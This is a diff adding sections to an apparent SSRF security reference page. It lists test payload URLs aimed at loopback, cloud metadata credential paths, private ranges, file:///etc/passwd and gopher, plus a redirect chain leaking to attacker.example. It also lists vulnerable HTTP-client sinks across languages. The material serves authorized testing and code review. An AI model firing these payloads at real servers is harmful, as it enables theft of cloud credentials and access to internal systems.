@@ -30,6 +30,112 @@ The unsafe assumption is that only public URLs will be requested. Attackers use 
 | **High-value targets** | Cloud metadata (`169.254.169.254`), internal admin panels, file servers on RFC1918 ranges |
 | **Blast radius** | Workers, serverless functions, and containers with broad VPC egress |
 
+## Attack Payloads
+
+Use these in authorized tests against URL fetchers, webhooks, and import-from-URL features. Confirm which networks and protocols the server process may reach.
+
+### Pattern 1: Loopback and localhost (SSRF abuse scenario)
+
+```text
+http://127.0.0.1/admin
+http://localhost:8080/actuator/health
+http://[::1]/internal/
+http://127.1/
+```
+
+### Pattern 2: Cloud metadata
+
+```text
+http://169.254.169.254/latest/meta-data/
+http://metadata.google.internal/computeMetadata/v1/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```
+
+### Pattern 3: Private RFC1918 ranges
+
+```text
+http://10.0.0.15:9200/
+http://192.168.1.1/
+http://172.16.0.5/internal-api/users
+```
+
+### Pattern 4: Alternate IP encodings and DNS rebinding
+
+```text
+http://2130706433/          # decimal 127.0.0.1
+http://0x7f000001/
+http://attacker-controlled.example  # resolves to 127.0.0.1 after TTL
+```
+
+### Pattern 5: Non-HTTP schemes and file reads
+
+```text
+file:///etc/passwd
+file:///c:/windows/win.ini
+gopher://internal:70/
+```
+
+### Pattern 6: Open redirect and egress exfiltration chains
+
+```text
+https://public.example/redirect?next=http://169.254.169.254/
+http://internal.service/ → 302 Location: http://attacker.example/?leak=
+```
+
+## Language-Specific Sinks and Dangerous APIs
+
+Any server-side HTTP client that accepts a user-influenced URL or host is a review priority.
+
+### Python
+
+```python
+requests.get(user_url, allow_redirects=True)
+urllib.request.urlopen(image_url)
+httpx.AsyncClient().get(webhook_target)
+```
+
+`aiohttp`, `selenium` with user URLs, PDF renderers that fetch remote assets.
+
+### Java
+
+```java
+new URL(userUrl).openStream();
+HttpClient.newHttpClient().send(HttpRequest.newBuilder().uri(URI.create(url)).build(), ...);
+RestTemplate.getForObject(userUrl, String.class);
+```
+
+Apache `HttpClient`, `ImageIO.read(new URL(url))`, SSRF in SAML/OIDC metadata fetchers.
+
+### C#
+
+```csharp
+await httpClient.GetAsync(userUrl);
+await new HttpClient().GetStringAsync(previewUrl);
+WebClient.DownloadString(imageUrl);
+```
+
+### JavaScript (Node.js)
+
+```javascript
+const res = await fetch(req.query.url);
+axios.get(req.body.webhook);
+https.get(userProvidedUrl, (r) => { ... });
+```
+
+### Go
+
+```go
+resp, err := http.Get(r.URL.Query().Get("url"))
+client.Get(userURL)
+```
+
+### Shell and integration scripts
+
+```bash
+curl "$USER_URL"
+wget -O- "$WEBHOOK"
+```
+
 ## Sample Vulnerable Code in Python
 
 ```python
